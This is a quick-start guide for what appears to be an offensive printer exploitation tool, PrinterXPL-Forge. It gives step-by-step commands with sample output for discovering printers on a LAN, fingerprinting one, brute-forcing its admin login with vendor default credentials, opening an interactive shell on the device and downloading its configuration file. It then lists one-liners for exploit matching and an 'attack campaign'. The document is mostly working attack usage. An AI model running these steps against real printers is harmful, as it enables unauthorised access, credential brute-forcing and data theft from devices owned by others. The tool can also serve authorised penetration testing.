# Quick Start

Get your first results in under 60 seconds.

---

## Step 1 — Install

```bash
git clone https://github.com/mrhenrike/PrinterXPL-Forge.git
cd PrinterXPL-Forge
python -m venv .venv && source .venv/bin/activate    # Linux/macOS
python -m venv .venv && .venv\Scripts\activate       # Windows
pip install -r requirements.txt
```

---

## Step 2 — Find a printer

```bash
python printerxpl-forge.py --discover-local
```

Output:
```
[SNMP] Scanning 192.168.0.0/24 ...
192.168.0.152  EPSON L3250  Ready
```

---

## Step 3 — Fingerprint the target

```bash
python printerxpl-forge.py 192.168.0.152 --scan --no-nvd
```

Output (key fields):
```
  Make    : Epson
  Model   : L3250 Series
  Serial  : XAABT77481
  Firmware: 05.22.XF26P8
  HTTP    : 200 OK (EPSON Web Config)
  SNMP    : public  sysDescr=EPSON L3250 Series
```

---

## Step 4 — Brute-force login

```bash
python printerxpl-forge.py 192.168.0.152 --bruteforce \
  --bf-vendor epson --bf-serial XAABT77481 --bf-no-variations
```

Output:
```
  [+] FOUND: HTTP → 'admin' / 'epson'
```

---

## Step 5 — Open interactive shell

```bash
python printerxpl-forge.py 192.168.0.152 auto
```

```
192.168.0.152:/> id
EPSON L3250 Series, Firmware 05.22.XF26P8

192.168.0.152:/> ls /
./
../
EpsonInternal/
webServer/

192.168.0.152:/> download /webServer/config/soe.xml
```

---

## Common one-liners

```bash
# Guided menu (no arguments)
python printerxpl-forge.py

# Full scan + exploit matching
python printerxpl-forge.py 192.168.1.100 --scan --xpl

# Full attack campaign (dry-run)
python printerxpl-forge.py 192.168.1.100 --attack-matrix

# Send a print job
python printerxpl-forge.py 192.168.1.100 --send-job document.txt

# List all exploit modules
python printerxpl-forge.py --xpl-list

# Check API key status
python printerxpl-forge.py --check-config
```
